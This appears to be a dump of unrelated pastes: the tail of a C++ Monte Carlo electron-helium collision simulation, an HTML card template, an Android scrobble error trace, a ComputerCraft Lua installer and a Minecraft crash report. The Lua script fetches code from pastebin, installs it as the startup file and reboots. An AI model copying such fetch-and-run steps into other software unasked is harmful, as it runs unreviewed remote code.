            double nu_inelastic2 = (N_He/Volume) * inelastic2_vec[bin_energy] * sqrt(2.0*electron_energy*q/m_e);
            double nu_superelastic2 = (exc_2.size()/Volume) * superelastic2_vec[bin_energy] * sqrt(2.0*electron_energy*q/m_e);

            double r = dis(gen);

            double P0 = nu_elastic/nu_max;
            double P1 = (nu_elastic + nu_inelastic1)/nu_max;
            double P2 = (nu_elastic + nu_inelastic1 + nu_superelastic1)/nu_max;
            double P3 = (nu_elastic + nu_inelastic1 + nu_superelastic1 + nu_inelastic2)/nu_max;
            double P4 = (nu_elastic + nu_inelastic1 + nu_superelastic1 + nu_inelastic2 + nu_superelastic2)/nu_max;            

            if (r < P0) {

                // elastic collision happens

                // ----   Collision energy redistribution module

                // electron particle X Y Z initial velocities and energy
                double V0_x_1 = e.vx;
                double V0_y_1 = e.vy;
                double V0_z_1 = e.vz;

                // neutral particle X Y Z initial velocities

                // randomize particles each collision
                NeutralParticle tmp_neutral;
                tmp_neutral.initialize(gen, dis, maxwell_neutral);
                double V0_x_2 = tmp_neutral.vx;
                double V0_y_2 = tmp_neutral.vy;
                double V0_z_2 = tmp_neutral.vz;

                // initial relative velocity X Y Z (must be equal to final relative velocity in center-of-mass frame) 

                double V0_rel_x = (V0_x_1 - V0_x_2);
                double V0_rel_y = (V0_y_1 - V0_y_2);
                double V0_rel_z = (V0_z_1 - V0_z_2);

                double V0_rel = sqrt(V0_rel_x*V0_rel_x + V0_rel_y*V0_rel_y + V0_rel_z*V0_rel_z);

                // center-of-mass frame initial velocity (magnitude of it must be equal to the counterpart in this frame)

                double V_cm_x = (m_e*V0_x_1 + M_n*V0_x_2)/(m_e + M_n);
                double V_cm_y = (m_e*V0_y_1 + M_n*V0_y_2)/(m_e + M_n);
                double V_cm_z = (m_e*V0_z_1 + M_n*V0_z_2)/(m_e + M_n);                    

                // generating random variables to calculate random direction of center-of-mass after the collision

                double R1 = dis(gen);
                double R2 = dis(gen);

                // calculating spherical angles for center-of-mass random direction
                double theta = acos(1.0- 2.0*R1);
                double phi = 2*M_PI*R2;

                //calculating final relative velocity with random direction

                double V_rel_x = V0_rel*sin(theta)*cos(phi);
                double V_rel_y = V0_rel*sin(theta)*sin(phi);
                double V_rel_z = V0_rel*cos(theta);

                double V_rel = sqrt(V_rel_x*V_rel_x + V_rel_y*V_rel_y + V_rel_z*V_rel_z);

                //calculating final velocity of electron

                double V_x_1 = V_cm_x + V_rel_x * (M_n/(m_e + M_n));
                double V_y_1 = V_cm_y + V_rel_y * (M_n/(m_e + M_n));
                double V_z_1 = V_cm_z + V_rel_z * (M_n/(m_e + M_n));

                double V_1 = sqrt(V_x_1*V_x_1 + V_y_1*V_y_1 + V_z_1*V_z_1);

                //updating electron energy and velocities
                
                e.energy = m_e*V_1*V_1/(2.0*q);
                e.vx = V_x_1;
                e.vy = V_y_1;
                e.vz = V_z_1;

                collision_counter_en++;
                el_coll_counter++;

                e.collided_en = true;
            }        

            else if (r < P1) {

                //inelastic 1(triplet) collision happens

                // ----   Collision energy redistribution module
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;
                
                // neutral that collides with electron

                // randomize particles each collision

                NeutralParticle tmp_neutral;
                tmp_neutral.initialize(gen, dis, maxwell_neutral);
                double V_x_n = tmp_neutral.vx;
                double V_y_n = tmp_neutral.vy;
                double V_z_n = tmp_neutral.vz;
                double E_n = tmp_neutral.energy;

 
                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);
                
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = (2.0 + E_0 - 2.0*pow((1+E_0), R1))/E_0;
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
 
                double phi = 2.0*M_PI*R2;
                double cos_theta = V0_x/V0;
                double sin_theta = sqrt(1.0 - cos_theta*cos_theta);
                // //calculating final relative velocity with random direction
 
                //calculating final velocity of electron
 
                double i_scat = (V0_x/V0)*cos_khi + (1.0 - (V0_x/V0)*(V0_x/V0))*(sin_khi*cos(phi)/sin_theta);
                double j_scat = (V0_y/V0)*cos_khi +  (V0_z/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_y/V0)*sin_khi*cos(phi)/sin_theta;
                double k_scat = (V0_z/V0)*cos_khi - (V0_y/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_z/V0)*sin_khi*cos(phi)/sin_theta;
 
                //updating electron energy and velocities         
                
                if (e.energy < thresh1) {
                    null_coll_counter++;
                    collision_counter_en++;
                    e.collided_en = true;
                    continue;
                }
                else {
                    e.energy = E_0 - thresh1;
 
                    double speed = sqrt(2*e.energy*q/m_e);
 
                    e.vx = speed*i_scat;
                    e.vy = speed*j_scat;
                    e.vz = speed*k_scat;
 
                    collision_counter_en++;   
                    exc1_coll_counter++;
                    exc1_coll_counter_temp++;
 
                    e.collided_en = true;

                    // pushing this neutral to an array of excited species exc_1

                    exc_1.push_back({E_n, V_x_n, V_y_n, V_z_n});
                }
            }     

            else if (r < P2) {

                //supernelastic 1(triplet -> ground state) collision happens

                if (exc_1.empty()) {
                    null_coll_counter++;
                    collision_counter_en++;
                    e.collided_en = true;
                    continue;            
                }

                // ----   Collision energy redistribution module
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;

                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);

                // neutral that collides with electron
                // taking particles from dynamic array of excited neutrals

                int index = std::uniform_int_distribution<int>(0, exc_1.size()-1)(gen);
                Excited_neutral& exc = exc_1[index];
                double V_x = exc.vx;
                double V_y = exc.vy;
                double V_z = exc.vz;
                double E = exc.energy;
                
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = (2.0 + E_0 - 2.0*pow((1+E_0), R1))/E_0;
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
 
                double phi = 2.0*M_PI*R2;
                double cos_theta = V0_x/V0;
                double sin_theta = sqrt(1.0 - cos_theta*cos_theta);
                // //calculating final relative velocity with random direction
 
                //calculating final velocity of electron
 
                double i_scat = (V0_x/V0)*cos_khi + (1.0 - (V0_x/V0)*(V0_x/V0))*(sin_khi*cos(phi)/sin_theta);
                double j_scat = (V0_y/V0)*cos_khi +  (V0_z/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_y/V0)*sin_khi*cos(phi)/sin_theta;
                double k_scat = (V0_z/V0)*cos_khi - (V0_y/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_z/V0)*sin_khi*cos(phi)/sin_theta;
 
                //updating electron energy and velocities         
                
                e.energy = E_0 + thresh1;

                double speed = sqrt(2*e.energy*q/m_e);

                e.vx = speed*i_scat;
                e.vy = speed*j_scat;
                e.vz = speed*k_scat;

                //counting collisions, working with flags, popping atom out of the vector

                std::swap(exc_1[index], exc_1.back());
                exc_1.pop_back();

                collision_counter_en++;   
                super1_coll_counter++;
                super1_coll_counter_temp++;

                e.collided_en = true;
            }  

            else if (r < P3) {

                //inelastic 1(singlet) excitation collision happens

                // ----   Collision energy redistribution module
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;
                
                // neutral that collides with electron

                // randomize particles each collision

                NeutralParticle tmp_neutral;
                tmp_neutral.initialize(gen, dis, maxwell_neutral);
                double V_x_n = tmp_neutral.vx;
                double V_y_n = tmp_neutral.vy;
                double V_z_n = tmp_neutral.vz;
                double E_n = tmp_neutral.energy;

 
                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);
                
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = (2.0 + E_0 - 2.0*pow((1+E_0), R1))/E_0;
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
 
                double phi = 2.0*M_PI*R2;
                double cos_theta = V0_x/V0;
                double sin_theta = sqrt(1.0 - cos_theta*cos_theta);
                // //calculating final relative velocity with random direction
 
                //calculating final velocity of electron
 
                double i_scat = (V0_x/V0)*cos_khi + (1.0 - (V0_x/V0)*(V0_x/V0))*(sin_khi*cos(phi)/sin_theta);
                double j_scat = (V0_y/V0)*cos_khi +  (V0_z/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_y/V0)*sin_khi*cos(phi)/sin_theta;
                double k_scat = (V0_z/V0)*cos_khi - (V0_y/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_z/V0)*sin_khi*cos(phi)/sin_theta;
 
                //updating electron energy and velocities         
                
                if (e.energy < thresh2) {
                    null_coll_counter++;
                    collision_counter_en++;
                    e.collided_en = true;
                    continue;
                }
                else {
                    e.energy = E_0 - thresh2;
 
                    double speed = sqrt(2*e.energy*q/m_e);
 
                    e.vx = speed*i_scat;
                    e.vy = speed*j_scat;
                    e.vz = speed*k_scat;
 
                    collision_counter_en++;   
                    exc2_coll_counter++;
                    exc2_coll_counter_temp++;
 
                    e.collided_en = true;

                    // pushing this neutral to an array of excited species exc_2

                    exc_2.push_back({E_n, V_x_n, V_y_n, V_z_n});
                }
            }

            else if (r < P4) {

                //supernelastic 1(singlet -> ground state) collision happens

                if (exc_2.empty()) {
                    null_coll_counter++;
                    collision_counter_en++;
                    e.collided_en = true;
                    continue;            
                }

                // ----   Collision energy redistribution module
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;

                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);

                // neutral that collides with electron
                // taking particles from dynamic array of excited neutrals

                int index = std::uniform_int_distribution<int>(0, exc_2.size()-1)(gen);
                Excited_neutral& exc = exc_2[index];
                double V_x = exc.vx;
                double V_y = exc.vy;
                double V_z = exc.vz;
                double E = exc.energy;
                
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = (2.0 + E_0 - 2.0*pow((1+E_0), R1))/E_0;
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
 
                double phi = 2.0*M_PI*R2;
                double cos_theta = V0_x/V0;
                double sin_theta = sqrt(1.0 - cos_theta*cos_theta);
                // //calculating final relative velocity with random direction
 
                //calculating final velocity of electron
 
                double i_scat = (V0_x/V0)*cos_khi + (1.0 - (V0_x/V0)*(V0_x/V0))*(sin_khi*cos(phi)/sin_theta);
                double j_scat = (V0_y/V0)*cos_khi +  (V0_z/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_y/V0)*sin_khi*cos(phi)/sin_theta;
                double k_scat = (V0_z/V0)*cos_khi - (V0_y/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_z/V0)*sin_khi*cos(phi)/sin_theta;
 
                //updating electron energy and velocities         
                
                e.energy = E_0 + thresh2;

                double speed = sqrt(2*e.energy*q/m_e);

                e.vx = speed*i_scat;
                e.vy = speed*j_scat;
                e.vz = speed*k_scat;

                //counting collisions, working with flags, popping atom out of the vector

                std::swap(exc_2[index], exc_2.back());
                exc_2.pop_back();

                collision_counter_en++;   
                super2_coll_counter++;
                super2_coll_counter_temp++;

                e.collided_en = true;
            }              

            else {
                // null-collision
                collision_counter_en++;
                null_coll_counter++;
                e.collided_en = true;
            }
        }

        // ----- -------now begin e-e collisions ------ /////

        // Reshuffle electron indices for random pairing for e-e collisions
        std::shuffle(electron_indices.begin(), electron_indices.end(), gen);

        int max_pairs = n_e/2; // each electron collides 
        
        #pragma omp parallel for
        for (int i = 0; i < max_pairs; i++){

            int id1 = electron_indices[2 * i];
            int id2 = electron_indices[2 * i + 1];
            if (id1 >= n_e || id2 >= n_e) continue; // Handle edge case

            Electron& e1 = electrons[id1];
            Electron& e2 = electrons[id2];

            if (e1.collided_ee || e2.collided_ee) continue; //handle already collided cases

            double E_initial = e1.energy + e2.energy; // total initial energy of pair to check the energy conservation

            // generating random variables to calculate random direction of center-of-mass after the collision

            double R1 = dis(gen);
            double R2 = dis(gen);        

            // ----   Collision energy redistribution module

            // first particle X Y Z initial velocities
            double V0_x_1 = e1.vx;
            double V0_y_1 = e1.vy;
            double V0_z_1 = e1.vz;
            // second particle X Y Z initial velocities
            double V0_x_2 = e2.vx;
            double V0_y_2 = e2.vy;
            double V0_z_2 = e2.vz;

            // file13 << ""V0_x_1: "" << V0_x_1 << "" "" << ""V0_y_1: "" << V0_y_1 << "" "" << "" V0_z_1: "" << V0_z_1 << "" "";
            // file13 << ""V0_x_2: "" << V0_x_2 << "" "" << ""V0_y_2: "" << V0_y_2 << "" "" << "" V0_z_2: "" << V0_z_2 << "" "";

            // initial relative velocity X Y Z (must be equal to final relative velocity in center-of-mass frame) 

            double V0_rel_x = (V0_x_1 - V0_x_2);
            double V0_rel_y = (V0_y_1 - V0_y_2);
            double V0_rel_z = (V0_z_1 - V0_z_2);

            double V0_rel = sqrt(V0_rel_x*V0_rel_x + V0_rel_y*V0_rel_y + V0_rel_z*V0_rel_z);
            double V0_rel_normal = sqrt(V0_rel_y*V0_rel_y + V0_rel_z*V0_rel_z);

            // file13 << ""V0_rel: "" << V0_rel << "" "" << ""V0_rel_normal: "" << V0_rel_normal << "" "";

            if(std::isnan(V0_rel) || std::isinf(V0_rel) || fabs(V0_rel) < 1e-12){
                std::cerr << ""Invalid V0_rel computed: "" << V0_rel << "" at timestep "" << t << std::endl;
                continue;
            }
            
            if(std::isnan(V0_rel_normal) || std::isinf(V0_rel_normal) || fabs(V0_rel_normal) < 1e-12){
                std::cerr << ""Invalid V0_rel_normal computed: "" << V0_rel << "" at timestep "" << t << std::endl;
                continue;
            }                        

            // calculating spherical angles for center-of-mass random direction
            double theta = acos(1.0- 2.0*R1);
            double phi = 2*M_PI*R2;

            // calcluating h for equations 20a, 20b (Nanbu1995)

            double eps = 2*M_PI*R1;

            double h_x = V0_rel_normal*cos(eps);
            double h_y = -(V0_rel_y*V0_rel_x*cos(eps) + V0_rel*V0_rel_z*sin(eps))/V0_rel_normal;
            double h_z = -(V0_rel_z*V0_rel_x*cos(eps) - V0_rel*V0_rel_y*sin(eps))/V0_rel_normal;    

            //  calculating s (Nanbu1995 eq 19)

            double s = Coulomb_log/(4.0*M_PI) * pow((q*q/(epsilon_0*(m_e/2))),2) * (n_e/Volume) * pow(V0_rel,-3) * dt;

            // file13 << ""s: "" << s << "" "";

            if(std::isnan(s) || std::isinf(s) || fabs(s) < 1e-12){
                std::cerr << ""Invalid s computed: "" << s << "" at timestep "" << t << std::endl;
                continue;
            }

            double A = solve_A(s);   

            if(std::isnan(A) || std::isinf(A) || fabs(A) < 1e-12){
//                std::cerr << ""Invalid A computed: "" << A << "" at timestep "" << t << std::endl;
                A = 1.0E-12;
//                continue;
            }


            // calculating cos(khi) (Nanbu1995 eq 17)
            double cos_khi = 0.0;
            double sin_khi = 0.0;
            
            if (s < 1.0E-2) {// taking care of small s  
                cos_khi = 1.0 + s*log(R1);    
            }
            else {
                cos_khi = (1.0/A)*log(exp(-A) + 2.0*R1*sinh(A));
            }

            sin_khi = sqrt(1.0 - cos_khi*cos_khi);


            //calculating final velocity of first particle

            double V_x_1 = V0_x_1 - 0.5*(V0_rel_x*(1.0-cos_khi) + h_x*sin_khi);
            double V_y_1 = V0_y_1 - 0.5*(V0_rel_y*(1.0-cos_khi) + h_y*sin_khi);
            double V_z_1 = V0_z_1 - 0.5*(V0_rel_z*(1.0-cos_khi) + h_z*sin_khi);

            double V_1 = sqrt(V_x_1*V_x_1 + V_y_1*V_y_1 + V_z_1*V_z_1);

            //calculating final velocity of second particle

            double V_x_2 = V0_x_2 + 0.5*(V0_rel_x*(1.0-cos_khi) + h_x*sin_khi);
            double V_y_2 = V0_y_2 + 0.5*(V0_rel_y*(1.0-cos_khi) + h_y*sin_khi);
            double V_z_2 = V0_z_2 + 0.5*(V0_rel_z*(1.0-cos_khi) + h_z*sin_khi);

            double V_2 = sqrt(V_x_2*V_x_2 + V_y_2*V_y_2 + V_z_2*V_z_2);

            // updating velocities

            e1.vx = V_x_1; 
            e1.vy = V_y_1;
            e1.vz = V_z_1;

            e2.vx = V_x_2; // Update velocity components
            e2.vy = V_y_2;
            e2.vz = V_z_2;

            // calculating final energies of first and second colliding particles

            e1.energy = V_1*V_1*m_e/(2.0*q);
            e2.energy = V_2*V_2*m_e/(2.0*q);           

            double E_final = e1.energy + e2.energy;


            // if(fabs(E_final - E_initial) > 1e-6) {
            //     std::cerr << ""Energy conservation violation: "" << E_final - E_initial << "" eV\n"";
            // }

            // --- collision energy redistrubution module ends  

            // collision counters handling

            ee_coll_counter++;
            e1.collided_ee = true;
            e2.collided_ee = true;

        }
        //////----------------------e-e coulomb collision ends --------------/////////////////

        /// -- electrin field heating along E-Z axis begin--- ///
        for (int idx : electron_indices) {

            // Update velocity component due to electric field
            double a_z = (q * E_reduced) / m_e; // acceleration in z-direction, m/s^2
            electrons[idx].vz += a_z * dt;

            // Recalculate energy from updated velocity
            double vx = electrons[idx].vx;
            double vy = electrons[idx].vy;
            double vz = electrons[idx].vz;
            electrons[idx].energy = 0.5 * m_e * (vx*vx + vy*vy + vz*vz) / q;
        }
        // -------------------------------------------- filed heating ends ------------------------////////////////

        /// ---- data writing starts -----------////////////

            if (t%print_interval == 0){
            // open datafiles to write each time step to see evolution
            std::ostringstream filename;
            filename << ""data/distribution_"" << std::setw(4) << std::setfill('0') << t << "".dat"";

            std::ofstream file(filename.str());
            if (!file.is_open()){
            std::cerr << ""Error opening file: "" << filename.str() << std::endl;
            return 1;
            }
            // end opening datafiles for each timestep
            
            // creating histogram each timestep
            for (int i = 0; i < n_e; i++){
                int bin = (int)( (electrons[i].energy - Emin)/bin_width_smooth );
                if (bin >=0 && bin < N)
                histo_maxwell[bin]++;
            }

            // writing data each time step
            for (int i = 0; i < N_smooth; i++){
                double bin_center = Emin + (i + 0.5) * bin_width_smooth;
                file << bin_center << "" "" <<  static_cast<double>(histo_maxwell[i])/(electrons.size()*bin_width_smooth) << ""\n""; //f(E)
                histo_maxwell[i] = 0;
            }

            //     //instead, writing energies each timestep:

            // for (int i = 0; i < n_e; i++){
            //     file << i << "" "" << electrons[i].energy << ""\n"";
            // }


            file.close();

            }

            // end writing data each timestep
//            std::cout << ""number excitation collisions at timestep: "" << t << "" "" << ""is: "" << exc1_coll_counter_temp << ""\n"";             
//            std::cout << ""number superelatic collisions at timestep: "" << t << "" "" << ""is: "" << super1_coll_counter_temp << ""\n"";            
    }

    // ----- final electron energies distribution begins
    for (int i = 0; i < n_e; i++){

        file2 << i << "" "" << electrons[i].energy << ""\n"";

        int bin = static_cast<int>( (electrons[i].energy - Emin)/bin_width_smooth);
        if (bin >=0 && bin < histo_maxwell.size())
            histo_maxwell[bin]++;
    }

    int check = 0;
    for (int i = 0; i < N_smooth; i++){
        check += histo_maxwell[i];
        double bin_center = Emin + (i + 0.5) * bin_width_smooth;
        file4 << bin_center << "" "" <<  static_cast<double>(histo_maxwell[i])/(electrons.size()*bin_width_smooth) << ""\n""; // getting f(E)
    }

        std::cout << ""Total # of electrons in a final histogram: "" << check << ""\n"";

    // ----- final electron energies distribution ends

    // ------ excited atoms histogram --------/////

    for (int i = 0; i < exc_1.size(); i++) {

        file14 << i << "" "" << exc_1[i].energy << ""\n"";

        int bin = static_cast<int>( (exc_1[i].energy - Emin)/bin_width);
        if (bin >=0 && bin < histo_excited.size())
            histo_excited[bin]++;        
    }

    for (int i = 0; i < histo_excited.size(); i++){

        double bin_center = Emin + (i + 0.5) * bin_width;
        file15 << bin_center << "" "" <<  static_cast<double>(histo_excited[i])/(electrons.size()*bin_width) << ""\n""; // getting f(E)
    }


    file0.close();
    file1.close();
    file2.close();
    file3.close();
    file4.close();
    file5.close();
    file6.close();
    file7.close();
    file8.close();
    file9.close();
    file10.close();
    file11.close();
    file12.close();
    file13.close();
    file14.close();
    file15.close();
    file_temp.close();

    clock_t end = clock();

    double elapsed = (double)(end - start) / CLOCKS_PER_SEC;

    std::cout << ""# of steps: "" << steps << ""\n"";
    std::cout << ""# of electrons collided each timesteps:"" << Ne_collided << ""\n"";
    
    std::cout << ""Average elastic collisions per timestep: "" << static_cast<int>(el_coll_counter/steps) << ""\n"";
    std::cout << ""Average null collisions per timestep: "" << static_cast<int>(null_coll_counter/steps) << ""\n"";
    std::cout << ""\n"";

    std::cout << ""triplet:________"" << ""\n"";
    std::cout << ""Average triplet excitation collisions per timestep: "" << static_cast<int>(exc1_coll_counter/steps) << ""\n"";
    std::cout << ""\n"";
    std::cout << ""Average superelastic triplet collisions per timestep: "" << static_cast<int>(super1_coll_counter/steps) << ""\n"";
    std::cout << ""\n"";

    std::cout << ""singlet:________"" << ""\n"";
    std::cout << ""Average singlet excitation collisions per timestep: "" << static_cast<int>(exc2_coll_counter/steps) << ""\n"";
    std::cout << ""\n"";
    std::cout << ""Average superelastic singlet collisions per timestep: "" << static_cast<int>(super2_coll_counter/steps) << ""\n"";
    std::cout << ""\n"";    

    std::cout << ""Average e-e collisions per timestep: "" << static_cast<int>(ee_coll_counter/steps) << ""\n"";

    std::cout << ""Elapsed time: %f seconds "" << elapsed << ""\n"";


    return 0;

}"
yVNszL1N,#03 Cosmic Stars,AshenCovenant,HTML 5,Monday 14th of April 2025 01:46:59 PM CDT,"<!-- /*
Code by @ashencovenant
Uploaded: 14/04/2025

Do not copy or use as a base.
Do not remove credits.

Site: https://ashencovenant.tumblr.com/
Support me: https://ko-fi.com/ashencovenant
*/ -->

<link rel=""stylesheet"" href=""https://kit-pro.fontawesome.com/releases/v6.0.0-beta3/css/pro.min.css""/><link rel=""stylesheet"" href=""https://ashencovenant.github.io/codes
/cosmic-card.css""><div id=""ashncodes""> <div class=""cosmic-card""> <ccli></ccli> <div class=""cosmic-card-titu""><i class=""fa-solid fa-sparkles""></i></div> <div class=""cosmic-card-txt"">Lorem ipsum dolor sit amet consectetur adipisicing elit. Itaque vel dicta quo, saepe nostrum eligendi dolores commodi ratione repudiandae adipisci molestiae quas nobis consequuntur atque voluptate autem quisquam beatae explicabo? Lorem ipsum dolor sit amet consectetur adipisicing elit. Itaque vel dicta quo, saepe nostrum eligendi dolores commodi ratione repudiandae adipisci molestiae quas nobis consequuntur atque voluptate autem quisquam beatae explicabo? Lorem ipsum dolor sit amet consectetur adipisicing elit. Itaque vel dicta quo, saepe nostrum eligendi dolores commodi ratione repudiandae adipisci molestiae quas nobis consequuntur atque voluptate autem quisquam beatae explicabo? Lorem ipsum dolor sit amet consectetur adipisicing elit. Itaque vel dicta quo, saepe nostrum eligendi dolores commodi ratione repudiandae adipisci molestiae quas nobis consequuntur atque voluptate autem quisquam beatae explicabo? Lorem ipsum dolor sit amet consectetur adipisicing elit. Itaque vel dicta quo, saepe nostrum eligendi dolores commodi ratione repudiandae adipisci molestiae quas nobis consequuntur atque voluptate autem quisquam beatae explicabo? Lorem ipsum dolor sit amet consectetur adipisicing elit. Itaque vel dicta quo, saepe nostrum eligendi dolores commodi ratione repudiandae adipisci molestiae quas nobis consequuntur atque voluptate autem quisquam beatae explicabo? Lorem ipsum dolor sit amet consectetur adipisicing elit. Itaque vel dicta quo, saepe nostrum eligendi dolores commodi ratione repudiandae adipisci molestiae quas nobis consequuntur atque voluptate autem quisquam beatae explicabo? Lorem ipsum dolor sit amet consectetur adipisicing elit. Itaque vel dicta quo, saepe nostrum eligendi dolores commodi ratione repudiandae adipisci molestiae quas nobis consequuntur atque voluptate autem quisquam beatae explicabo? Lorem ipsum dolor sit amet consectetur adipisicing elit. Itaque vel dicta quo, saepe nostrum eligendi dolores commodi ratione repudiandae adipisci molestiae quas nobis consequuntur atque voluptate autem quisquam beatae explicabo? Lorem ipsum dolor sit amet consectetur adipisicing elit. Itaque vel dicta quo, saepe nostrum eligendi dolores commodi ratione repudiandae adipisci molestiae quas nobis consequuntur atque voluptate autem quisquam beatae explicabo? Lorem ipsum dolor sit amet consectetur adipisicing elit. Itaque vel dicta quo, saepe nostrum eligendi dolores commodi ratione repudiandae adipisci molestiae quas nobis consequuntur atque voluptate autem quisquam beatae explicabo? </div> <a href=""https://ashencovenant.tumblr.com/"" class=""accred"">@AshenCovenant</a> </div></div>

<style>:root { --coscar-col: #c4aa57; --coscar-txt: #c3c3c3; }</style>"
cajz8czJ,2025-04-14T20:46:45.740502,powerampache,PHP,Monday 14th of April 2025 01:46:46 PM CDT,"1.01-79-play (79) - DB: 83
luci.sixsixsix.powerampache2.domain.errors.ScrobbleException: {""errorAction"":""record_play"",""errorCode"":""4701"",""errorMessage"":""Session expir√©e"",""errorType"":""account""}
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl.scrobbleApiCall(SongsRepositoryImpl.kt:652)
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl.access$scrobbleApiCall(SongsRepositoryImpl.kt:80)
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl$scrobbleApiCall$1.invokeSuspend(Unknown Source:15)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at android.os.Handler.handleCallback(Handler.java:959)
	at android.os.Handler.dispatchMessage(Handler.java:100)
	at android.os.Looper.loopOnce(Looper.java:249)
	at android.os.Looper.loop(Looper.java:337)
	at android.app.ActivityThread.main(ActivityThread.java:9503)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:636)
	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1005)

scrobble() - "
HNp661wC,reactor_install,gamekiller,Lua,Monday 14th of April 2025 01:22:21 PM CDT,"--Vars
url_control = ""mLXi5pTF""
url_reactor = ""4KxV9EMD""

--Main
print""Enter commande : ('control' or 'reactor')""
local commande = read()
if commande == ""control"" then
	shell.run(""pastebin get ""..url_control.."" startup.lua"")
elseif commande == ""reactor"" then
	shell.run(""pastebin get ""..url_reactor.."" startup.lua"")
else
error(""Commande non valide"")
end
sleep(1)
os.reboot()"
sGammzhG,MC Crash Report,MineModder303,Java,Monday 14th of April 2025 01:10:19 PM CDT,"---- Minecraft Crash Report ----
// Don't be sad, have a hug! <3

Time: 13/04/25 08:30
Description: Ticking memory connection

java.lang.NullPointerException: Ticking memory connection
	at cpw.mods.fml.common.network.internal.FMLProxyPacket.func_148833_a(FMLProxyPacket.java:101)
	at net.minecraft.network.NetworkManager.func_74428_b(NetworkManager.java:212)
	at net.minecraft.network.NetworkSystem.func_151269_c(NetworkSystem.java:165)
	at net.minecraft.server.MinecraftServer.func_71190_q(MinecraftServer.java:659)
	at net.minecraft.server.MinecraftServer.func_71217_p(MinecraftServer.java:547)
	at net.minecraft.server.integrated.IntegratedServer.func_71217_p(IntegratedServer.java:111)
	at net.minecraft.server.MinecraftServer.run(MinecraftServer.java:427)
	at net.minecraft.server.MinecraftServer$2.run(MinecraftServer.java:685)


A detailed walkthrough of the error, its code path and all known details is as follows:
---------------------------------------------------------------------------------------

-- Head --
Stacktrace:
	at cpw.mods.fml.common.network.internal.FMLProxyPacket.func_148833_a(FMLProxyPacket.java:101)
	at net.minecraft.network.NetworkManager.func_74428_b(NetworkManager.java:212)

-- Ticking connection --
Details:
	Connection: net.minecraft.network.NetworkManager@88c7362
Stacktrace:
	at net.minecraft.network.NetworkSystem.func_151269_c(NetworkSystem.java:165)
	at net.minecraft.server.MinecraftServer.func_71190_q(MinecraftServer.java:659)
	at net.minecraft.server.MinecraftServer.func_71217_p(MinecraftServer.java:547)
	at net.minecraft.server.integrated.IntegratedServer.func_71217_p(IntegratedServer.java:111)
	at net.minecraft.server.MinecraftServer.run(MinecraftServer.java:427)
	at net.minecraft.server.MinecraftServer$2.run(MinecraftServer.java:685)

-- System Details --
Details:
	Minecraft Version: 1.7.10
	Operating System: Windows 10 (amd64) version 10.0
	Java Version: 1.8.0_441, Oracle Corporation
	Java VM Version: Java HotSpot(TM) 64-Bit Server VM (mixed mode), Oracle Corporation
	Memory: 204165624 bytes (194 MB) / 436207616 bytes (416 MB) up to 4294967296 bytes (4096 MB)
	JVM Flags: 8 total; -XX:HeapDumpPath=MojangTricksIntelDriversForPerformance_javaw.exe_minecraft.exe.heapdump -Xmx4G -XX:+UnlockExperimentalVMOptions -XX:+UseG1GC -XX:G1NewSizePercent=20 -XX:G1ReservePercent=20 -XX:MaxGCPauseMillis=50 -XX:G1HeapRegionSize=32M
	AABB Pool Size: 0 (0 bytes; 0 MB) allocated, 0 (0 bytes; 0 MB) used
	IntCache: cache: 12, tcache: 94, allocated: 0, tallocated: 0
	FML: MCP v9.05 FML v7.10.99.99 Minecraft Forge 10.13.4.1614 31 mods loaded, 31 mods active
